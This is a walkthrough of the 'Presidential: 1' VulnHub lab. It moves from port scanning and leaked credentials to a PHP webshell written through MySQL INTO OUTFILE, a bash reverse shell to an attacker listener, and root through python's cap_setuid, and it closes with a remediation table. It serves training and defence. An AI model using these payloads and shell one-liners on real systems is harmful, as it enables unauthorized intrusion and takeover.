# Presidential: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.0.x |
| **Difficulty** | Medium |
| **OS** | Linux (CentOS) |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/presidential-1-vulnhub-walkthrough/) |

## Attack Summary

Presidential: 1 is a medium-difficulty CentOS machine. The attack path involves web enumeration to find a phpMyAdmin instance, SQL injection or credential discovery to access the database, writing a PHP webshell via MySQL `INTO OUTFILE`, and privilege escalation using Linux capabilities (`cap_setuid+ep` on `python`) to gain root.

## Methodology

1. Host discovery and port scan
2. Web enumeration — vHost discovery, config file leak
3. phpMyAdmin credential access via leaked database credentials
4. PHP webshell via MySQL `INTO OUTFILE`
5. Reverse shell
6. Linux capabilities enumeration and exploitation

## Step 1: Reconnaissance

### Host Discovery

```bash
netdiscover -r 192.168.0.0/24
```

### Port Scan

```bash
nmap -sV -sC -p- $TARGET
```

![nmap](images/01-nmap.png)

| Port | Service |
|---|---|
| 80/tcp | Apache httpd |
| 2082/tcp | HTTP (phpMyAdmin) |

## Step 2: Web Enumeration

### Main Site

Browse to `http://TARGET/`. The site is a political campaign page for "President Turanga Leela."

### Directory Brute-Force

```bash
gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak
```

![Web Enum](images/02-web-enum.png)

Discover configuration backup or database credential file (e.g., `config.php.bak` or similar). This file leaks database credentials.

### Virtual Host Enumeration

```bash
gobuster vhost -u http://$TARGET/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

A virtual host like `votenow.local` or similar may be discovered. Add it to `/etc/hosts`.

## Step 3: phpMyAdmin Access

Browse to `http://$TARGET:2082/`. Log in with the credentials discovered in Step 2.

Once logged in, identify the web root path from MySQL variables:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
-- Also check @@datadir and @@basedir
```

## Step 4: PHP Webshell via MySQL INTO OUTFILE

Write a webshell to the web root using a SQL query:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

Verify execution:

```bash
curl "http://$TARGET/shell.php?cmd=id"
# Expected: uid=48(apache)
```

![Webshell](images/03-webshell.png)

## Step 5: Reverse Shell

Set up a listener:

```bash
nc -lvp 4444
```

Trigger the reverse shell:

```bash
curl "http://$TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/4444+0>%261'"
```

Stabilize the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

## Step 6: Privilege Escalation — Linux Capabilities

Enumerate binaries with special capabilities:

```bash
getcap -r / 2>/dev/null
```

Output shows something like:

```
/usr/bin/python2.7 = cap_setuid+ep
```

![Capabilities](images/04-privesc.png)

Use Python's `cap_setuid` capability to set UID to 0 and spawn a root shell:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Root shell obtained.

## Step 7: Root Flag

```bash
cd /root
cat root.txt
```

![Root Flag](images/05-root-flag.png)

## Lessons Learned

- Configuration files with database credentials should never be accessible via HTTP.
- phpMyAdmin on non-standard ports is still discoverable — restrict access by IP.
- MySQL `INTO OUTFILE` can write arbitrary files if the web root is in `secure_file_priv` path.
- Linux capabilities (`cap_setuid`) are as dangerous as SUID bits; enumerate them during privilege escalation.

## Remediation

| Vulnerability | Fix |
|---|---|
| Exposed config/credential file | Move sensitive configs outside the web root; use environment variables |
| phpMyAdmin on public port | Restrict phpMyAdmin to localhost or use firewall rules |
| MySQL `INTO OUTFILE` to web root | Set `secure_file_priv` to a non-web path; disable `FILE` privilege for web users |
| `cap_setuid` on Python | Remove the capability: `setcap -r /usr/bin/python2.7` |
